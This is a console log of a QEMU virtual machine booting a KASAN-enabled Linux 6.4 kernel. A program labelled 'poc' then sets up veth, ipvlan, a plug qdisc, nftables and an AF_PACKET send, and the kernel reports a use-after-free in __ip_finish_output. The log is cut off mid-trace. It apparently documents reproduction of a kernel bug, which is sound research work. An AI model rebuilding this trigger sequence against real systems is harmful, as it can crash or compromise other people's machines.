bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004bc13a8
input_len: 0x00000000019e55a1
output: 0x0000000001000000
output_len: 0x0000000005530404
kernel_total_size: 0x0000000005230000
needed_size: 0x0000000005600000
trampoline_32bit: 0x000000000009d000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.4.0-04322-gc451410ca7e3-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Fri May 15 18:39:12 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] printk: bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000002] kvm-clock: using sched offset of 434946687 cycles
[    0.001417] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.006109] tsc: Detected 2995.198 MHz processor
[    0.008807] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.010913] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.013600] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.021851] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.023770] Using GB pages for direct mapping
[    0.025120] Incomplete global flushes, disabling PCID
[    0.025318] RAMDISK: [mem 0x7fe8d000-0x7ffdffff]
[    0.028811] ACPI: Early table checksum verification disabled
[    0.030405] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.031979] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.034263] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.036703] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.039157] ACPI: FACS 0x000000007FFE0000 000040
[    0.040366] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.042832] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.045269] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.047651] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.049862] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.051794] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.053821] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.055850] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.057801] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.060544] No NUMA configuration found
[    0.061645] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.063480] NODE_DATA(0) allocated [mem 0x7fe89000-0x7fe8cfff]
[    0.065130] Zone ranges:
[    0.065808]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.067641]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.069415]   Normal   empty
[    0.070252] Movable zone start for each node
[    0.071469] Early memory node ranges
[    0.072469]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.074255]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.076227] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.079229] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.079279] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.099070] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.204647] kasan: KernelAddressSanitizer initialized
[    0.208635] ACPI: PM-Timer IO Port: 0x608
[    0.209711] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.211401] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.213344] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.215185] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.216950] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.218719] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.220973] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.223060] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.225002] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.226489] TSC deadline timer available
[    0.227581] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.228961] kvm-guest: KVM setup pv remote TLB flush
[    0.230461] kvm-guest: setup PV sched yield
[    0.231782] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.233986] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.236087] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.238125] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.240173] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.241842] Booting paravirtualized kernel on KVM
[    0.243246] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.256693] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.261852] percpu: Embedded 66 pages/cpu s232168 r8192 d29976 u1048576
[    0.264546] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.267460] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.270220] random: crng init done
[    0.275050] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.281653] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.284206] Fallback order for Node 0: 0 
[    0.284218] Built 1 zonelists, mobility grouping on.  Total pages: 515808
[    0.286440] Policy zone: DMA32
[    0.287143] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.288808] stackdepot: allocating hash table via alloc_large_system_hash
[    0.304698] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    0.332767] Memory: 1692940K/2096632K available (49152K kernel code, 7959K rwdata, 10096K rodata, 5664K init, 2892K bss, 403436K reserved, 0K cma-reserved)
[    0.337225] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    0.341954] Dynamic Preempt: voluntary
[    0.347443] rcu: Preemptible hierarchical RCU implementation.
[    0.348971] rcu: 	RCU event tracing is enabled.
[    0.351291] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.353146] 	Trampoline variant of Tasks RCU enabled.
[    0.354471] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.356443] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.370598] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.372229] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.381940] Console: colour VGA+ 80x25
[    0.383083] printk: console [ttyS0] enabled
[    0.383083] printk: console [ttyS0] enabled
[    0.385491] printk: bootconsole [earlyser0] disabled
[    0.385491] printk: bootconsole [earlyser0] disabled
[    0.388494] ACPI: Core revision 20230331
[    0.390922] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.393373] APIC: Switch to symmetric I/O mode setup
[    0.395133] kvm-guest: setup PV IPIs
[    0.398614] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.400214] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    0.403673] Calibrating delay loop (skipped) preset value.. 5990.39 BogoMIPS (lpj=2995198)
[    0.405141] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.406879] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.408666] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.409788] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.410706] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.411682] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.412688] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.413684] RETBleed: Mitigation: Enhanced IBRS
[    0.414710] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.415738] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.416689] MMIO Stale Data: Unknown: No mitigations
[    0.418744] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.419683] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.421652] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.422686] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.423684] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    0.455732] Freeing SMP alternatives memory: 44K
[    0.456721] pid_max: default: 32768 minimum: 301
[    0.458909] LSM: initializing lsm=capability,selinux,integrity
[    0.460678] SELinux:  Initializing.
[    0.462686] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.464677] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.469494] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    0.470713] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1.
[    0.472057] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    0.472987] signal: max sigframe size: 1776
[    0.474093] rcu: Hierarchical SRCU implementation.
[    0.474700] rcu: 	Max phase no-delay instances is 400.
[    0.477900] smp: Bringing up secondary CPUs ...
[    0.479307] smpboot: x86: Booting SMP configuration:
[    0.479721] .... node  #0, CPUs:      #1
[    0.481853] smp: Brought up 1 node, 2 CPUs
[    0.483743] smpboot: Max logical packages: 1
[    0.484709] smpboot: Total of 2 processors activated (11980.79 BogoMIPS)
[    0.492674] devtmpfs: initialized
[    0.499837] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.500757] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.502685] PM: RTC time: 18:40:24, date: 2026-05-15
[    0.504914] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.506457] audit: initializing netlink subsys (disabled)
[    0.507715] audit: type=2000 audit(1778870424.611:1): state=initialized audit_enabled=0 res=1
[    0.510320] thermal_sys: Registered thermal governor 'step_wise'
[    0.510323] thermal_sys: Registered thermal governor 'user_space'
[    0.511388] cpuidle: using governor menu
[    0.515223] PCI: Using configuration type 1 for base access
[    0.517024] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.521050] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.522662] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.525709] ACPI: Added _OSI(Module Device)
[    0.527737] ACPI: Added _OSI(Processor Device)
[    0.528709] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.530725] ACPI: Added _OSI(Processor Aggregator Device)
[    0.549275] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.616168] ACPI: Interpreter enabled
[    0.616959] ACPI: PM: (supports S0 S3 S4 S5)
[    0.617720] ACPI: Using IOAPIC for interrupt routing
[    0.619026] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.619696] PCI: Using E820 reservations for host bridge windows
[    0.623650] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.667946] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.668960] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.669852] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.672050] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.673408] PCI host bridge to bus 0000:00
[    0.673892] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.674861] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.675940] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.676877] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.677877] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.678876] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.680166] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.698933] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.724273] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.726637] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    0.728650] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.729737] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.730756] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.731857] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.733589] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.734650] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.734801] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.737883] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    0.740242] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    0.742753] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    0.747223] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    0.748123] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.768486] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    0.770385] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    0.772756] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    0.778729] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    0.805293] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.811398] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.816000] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.824389] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.826324] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.840834] iommu: Default domain type: Translated 
[    0.841690] iommu: DMA domain TLB invalidation policy: lazy mode 
[    0.846792] SCSI subsystem initialized
[    0.852886] ACPI: bus type USB registered
[    0.857362] usbcore: registered new interface driver usbfs
[    0.860170] usbcore: registered new interface driver hub
[    0.862343] usbcore: registered new device driver usb
[    0.867271] pps_core: LinuxPPS API ver. 1 registered
[    0.868713] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.872195] PTP clock support registered
[    0.880059] Advanced Linux Sound Architecture Driver Initialized.
[    0.888881] NetLabel: Initializing
[    0.889608] NetLabel:  domain hash size = 128
[    0.889659] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.890793] NetLabel:  unlabeled traffic allowed by default
[    0.896218] PCI: Using ACPI for IRQ routing
[    0.899181] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.899650] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.899650] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.899777] vgaarb: loaded
[    0.904276] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.904724] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.910710] clocksource: Switched to clocksource kvm-clock
[    1.169076] VFS: Disk quotas dquot_6.6.0
[    1.173236] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    1.177769] pnp: PnP ACPI init
[    1.195569] pnp: PnP ACPI: found 6 devices
[    1.273201] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    1.278111] NET: Registered PF_INET protocol family
[    1.281730] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    1.293512] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    1.297048] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    1.301711] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    1.304073] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    1.305942] TCP: Hash tables configured (established 16384 bind 16384)
[    1.307703] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    1.309367] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    1.316827] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    1.324782] RPC: Registered named UNIX socket transport module.
[    1.327359] RPC: Registered udp transport module.
[    1.328861] RPC: Registered tcp transport module.
[    1.330094] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    1.343152] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    1.346355] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    1.349781] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    1.352682] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    1.355744] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    1.360793] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    1.363587] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    1.366833] PCI: CLS 0 bytes, default 64
[    1.376433] Unpacking initramfs...
[    1.380587] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    1.384693] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    1.431565] Initialise system trusted keyrings
[    1.436620] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    1.450261] NFS: Registering the id_resolver key type
[    1.452420] Key type id_resolver registered
[    1.455901] Key type id_legacy registered
[    1.460311] 9p: Installing v9fs 9p2000 file system support
[    1.467705] Key type asymmetric registered
[    1.468883] Asymmetric key parser 'x509' registered
[    1.471030] Freeing initrd memory: 1356K
[    1.471517] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    1.475976] io scheduler mq-deadline registered
[    1.477948] io scheduler kyber registered
[    1.480267] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    1.483091] ACPI: button: Power Button [PWRF]
[    1.485188] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    1.487964] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    1.490876] Non-volatile memory driver v1.3
[    1.492014] Linux agpgart interface v0.103
[    1.493200] ACPI: bus type drm_connector registered
[    1.505314] loop: module loaded
[    1.508470] scsi host0: ata_piix
[    1.509901] scsi host1: ata_piix
[    1.510959] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    1.513064] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    1.516096] e100: Intel(R) PRO/100 Network Driver
[    1.518030] e100: Copyright(c) 1999-2006 Intel Corporation
[    1.520854] e1000: Intel(R) PRO/1000 Network Driver
[    1.523150] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    1.672436] ata2: found unknown device (class 0)
[    1.675015] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    1.679817] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    1.706028] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    1.708154] cdrom: Uniform CD-ROM driver Revision: 3.20
[    2.189837] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    2.553081] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    2.557513] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    2.559633] e1000e: Intel(R) PRO/1000 Network Driver
[    2.560800] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    2.562248] sky2: driver version 1.30
[    2.563606] usbcore: registered new interface driver usblp
[    2.564990] usbcore: registered new interface driver usb-storage
[    2.566563] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    2.569519] serio: i8042 KBD port at 0x60,0x64 irq 1
[    2.570641] serio: i8042 AUX port at 0x60,0x64 irq 12
[    2.574032] rtc_cmos 00:05: RTC can wake from S4
[    2.576238] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    2.578401] rtc_cmos 00:05: registered as rtc0
[    2.580663] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    2.583679] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    2.587578] intel_pstate: CPU model not supported
[    2.589332] hid: raw HID events driver (C) Jiri Kosina
[    2.591690] usbcore: registered new interface driver usbhid
[    2.593443] usbhid: USB HID core driver
[    2.595954] Initializing XFRM netlink socket
[    2.597100] NET: Registered PF_INET6 protocol family
[    2.599045] Segment Routing with IPv6
[    2.600284] In-situ OAM (IOAM) with IPv6
[    2.601685] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    2.603480] NET: Registered PF_PACKET protocol family
[    2.605131] 9pnet: Installing 9P2000 support
[    2.606408] Key type dns_resolver registered
[    2.608305] IPI shorthand broadcast: enabled
[    2.624796] sched_clock: Marking stable (2599006393, 24930065)->(2843930857, -219994399)
[    2.627334] registered taskstats version 1
[    2.628386] Loading compiled-in X.509 certificates
[    2.642308] PM:   Magic number: 10:164:696
[    2.644883] printk: console [netcon0] enabled
[    2.648220] netconsole: network logging started
[    2.650377] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    2.652815] kworker/u4:2 (51) used greatest stack depth: 29536 bytes left
[    2.654895] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    2.656441] ALSA device list:
[    2.657466]   No soundcards found.
[    2.659821] Freeing unused kernel image (initmem) memory: 5664K
[    2.661503] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    2.663969] cfg80211: failed to load regulatory.db
[    2.667049] Write protecting the kernel read-only data: 59392k
[    2.668064] Freeing unused kernel image (rodata/data gap) memory: 144K
[    2.679091] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    2.680135] Run /init as init process
[    2.682749] mount (55) used greatest stack depth: 28704 bytes left

secb: rootfs ready
---- poc begin ----
[poc] create_veth(p1,p2): OK
[poc] p1.ifindex=4 p2.ifindex=3
[poc] create_ipvlan(ipv0,master=4,mode=1): OK
[poc] create_ipvlan(ipv1,master=4,mode=1): OK
[poc] ipv0.ifindex=5 ipv1.ifindex=6
[poc] add_ipv4(idx=4,10.1.1.1/24): OK
[poc] add_ipv4(idx=5,10.3.0.1/24): OK
[poc] add_ipv4(idx=6,10.4.0.1/24): OK
[poc] set_link_up_mtu(idx=4,mtu=0): OK
[poc] set_link_up_mtu(idx=3,mtu=0): OK
[poc] set_link_up_mtu(idx=5,mtu=400): OK
[poc] set_link_up_mtu(idx=6,mtu=10000): OK
[poc] add_route(10.6.0.0/16 dev oif=5): OK
[poc] add_route(10.7.0.0/16 dev oif=5): OK
[poc] sch_plug_add(idx=5,handle=0x10000): OK
[poc] sch_plug_action(idx=5,handle=0x10000,action=LIMIT,limit=1048576): OK
[poc] sch_plug_action(idx=5,handle=0x10000,action=BUFFER,limit=0): OK
[poc] nftables: sending batch (264 bytes, 3 msgs)
[poc] nfnl seq=1: OK
[poc] nfnl seq=2: OK
[poc] nfnl seq=3: OK
[poc] P3 stub: rtnetlink + nftables ready
[poc] firing AF_PACKET trigger via ipv1...
[poc] AF_PACKET sendto: 1500 bytes queued
[    2.783400] ==================================================================
[    2.785155] BUG: KASAN: slab-use-after-free in __ip_finish_output.part.0+0x719/0x950
[    2.786751] Read of size 1 at addr ffff88800a0c3012 by task ksoftirqd/1/19
[    2.788572] 
[    2.788993] CPU: 1 PID: 19 Comm: ksoftirqd/1 Not tainted 6.4.0-04322-gc451410ca7e3-dirty #1
[    2.794042] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    2.797812] Call Trace:
[    2.799169]  <TASK>
[    2.799746]  dump_stack_lvl+0x36/0x50
[    2.800873]  print_report+0xcf/0x660
[    2.801786]  ? __ip_finish_output.part.0+0x719/0x950
[    2.803164]  kasan_report+0xc7/0x100
[    2.803832]  ? __ip_finish_output.part.0+0x719/0x950
[    2.804620]  __ip_finish_output.part.0+0x719/0x950
[    2.805229]  ? __pfx___ip_finish_output.part.0+0x10/0x10
[    2.805875]  ? nf_hook_slow+0xa2/0x170
[    2.806281]  ip_output+0x2c7/0x650
[    2.806755]  ? ip_route_output_flow+0x12f/0x290
[    2.807429]  ? __pfx_ip_output+0x10/0x10
[    2.808055]  ? __pfx_ip_finish_output+0x10/0x10
[    2.808773]  ipvlan_queue_xmit+0x127b/0x1690
[    2.809456]  ? __stack_depot_save+0x39/0x470
[    2.810322]  ? kasan_save_stack+0x43/0x60
[    2.811266]  ? kasan_save_stack+0x33/0x60
[    2.812191]  ? __pfx_ipvlan_queue_xmit+0x10/0x10
[    2.813466]  ? rcu_core+0x5e8/0x18b0
[    2.814204]  ? kasan_save_stack+0x43/0x60
[    2.815213]  ? kasan_set_track+0x25/0x30
[    2.816294]  ? kasan_save_free_info+0x2b/0x50
[    2.817018]  ? __kasan_slab_free+0x10a/0x180
[    2.817615]  ? __pfx_skb_network_protocol+0x10/0x10
[    2.818285]  ? netif_skb_features+0x584/0x9b0
[    2.819022]  ipvlan_start_xmit+0x42/0xd0
[    2.819559]  dev_hard_start_xmit+0xc5/0x490
[    2.820214]  sch_direct_xmit+0x129/0xa50
[    2.820805]  ? update_load_avg+0x126/0x1b90
[    2.821446]  ? __pfx_sch_direct_xmit+0x10/0x10
[    2.822167]  ? save_fpregs_to_fpstate+0xaa/0x210
[    2.822716]  __qdisc_run+0x3c5/0x1780
[    2.823114]  net_tx_action+0x410/0x6b0
[    2.823526]  __do_softirq+0x1bf/0x5b5
[    2.823965]  ? __pfx___do_softirq+0x10/0x10
[    2.824587]  ? __pfx_run_ksoftirqd+0x10/0x10
[    2.825210]  run_ksoftirqd+0x1d/0x30
[    2.825728]  smpboot_thread_fn+0x2e5/0x6e0
[    2.826363]  ? __pfx_smpboot_thread_fn+0x10/0x10
[    2.827032]  kthread+0x29b/0x370
[    2.827445]  ? __pfx_kthread+0x10/0x10
[    2.828008]  ret_from_fork+0x29/0x50
[    2.828461]  </TASK>
[    2.828823] 
[    2.829037] Allocated by task 61:
[    2.829577]  kasan_save_stack+0x33/0x60
[    2.830112]  kasan_set_track+0x25/0x30
[    2.830737]  __kasan_kmalloc+0x8f/0xa0
[    2.832376]  __kmalloc+0x59/0x160
[    2.832902]  sk_prot_alloc+0x108/0x220
[    2.833484]  sk_alloc+0x2b/0x5b0
[    2.834314]  packet_create+0xdc/0x800
[    2.835030]  __sock_create+0x1c0/0x430
[    2.835706]  __sys_socket+0x118/0x1c0
[    2.836324]  __x64_sys_socket+0x6d/0xb0
